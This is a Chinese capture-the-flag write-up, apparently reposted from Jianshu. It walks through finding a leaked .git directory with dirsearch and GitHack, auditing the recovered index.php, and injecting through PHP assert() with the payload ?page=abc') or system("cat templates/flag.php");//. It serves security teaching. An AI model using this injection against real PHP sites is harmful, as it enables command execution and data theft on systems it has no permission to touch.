##### 题目信息：

![](//upload-images.jianshu.io/upload_images/10148719-458da349c11c38ec.png?imageMogr2/auto-orient/strip|imageView2/2/w/692/format/webp)

![[Pasted image 20231220155618.png]]
  
**工具：**GitHack,dirsearch  
**知识点：**git漏洞、代码审计

打开题目场景，检查网站，发现这样一个页面

  

![](//upload-images.jianshu.io/upload_images/10148719-fa13e01ee3cb7eef.png?imageMogr2/auto-orient/strip|imageView2/2/w/493/format/webp)

![[Pasted image 20231220155640.png]]

  

访问.git目录，疑似存在git源码泄露

  

![](//upload-images.jianshu.io/upload_images/10148719-aebb660b0ea56299.png?imageMogr2/auto-orient/strip|imageView2/2/w/600/format/webp)

![[Pasted image 20231220155700.png]]

再用dirsearch扫描，发现git源码泄露：
![[Pasted image 20231220155735.png]]
  

![](//upload-images.jianshu.io/upload_images/10148719-726ff091784a3cd6.png?imageMogr2/auto-orient/strip|imageView2/2/w/737/format/webp)

  

使用 GitHack获取源码

  

![](//upload-images.jianshu.io/upload_images/10148719-981c9e67174c1c70.png?imageMogr2/auto-orient/strip|imageView2/2/w/733/format/webp)

![[Pasted image 20231220155755.png]]
  
得到源码  

![](//upload-images.jianshu.io/upload_images/10148719-af36984307dc5e63.png?imageMogr2/auto-orient/strip|imageView2/2/w/276/format/webp)

  

index.php中关键代码如下

```php
<?php

if (isset($_GET['page'])) {
    $page = $_GET['page'];
} else {
    $page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

如果这个字符串中没有找到相应的子字符串 就返回false
// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>
```

```dart
assert() 检查一个断言是否为 FALSE
strpos() 函数查找字符串在另一字符串中第一次出现的位置。如果没有找到则返回False
file_exists() 函数检查文件或目录是否存在。
assert()函数会将括号中的字符当成代码来执行，并返回true或false。
```

payload:`?page=abc') or system("cat templates/flag.php");//`

$file =templates/ abc') or system("cat templates/flag.php");// ".php"  
因为在strpos中只传入了abc，所以其肯定返回false，在利用or让其执行system函数，再用" // "将后面的语句注释掉  
查看网页源代码

  ![[Pasted image 20231220155815.png]]

![](//upload-images.jianshu.io/upload_images/10148719-9fec8909c4296d17.png?imageMogr2/auto-orient/strip|imageView2/2/w/768/format/webp)

作者：简言之_  
链接：https://www.jianshu.com/p/795f918d791b  
来源：简书  
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。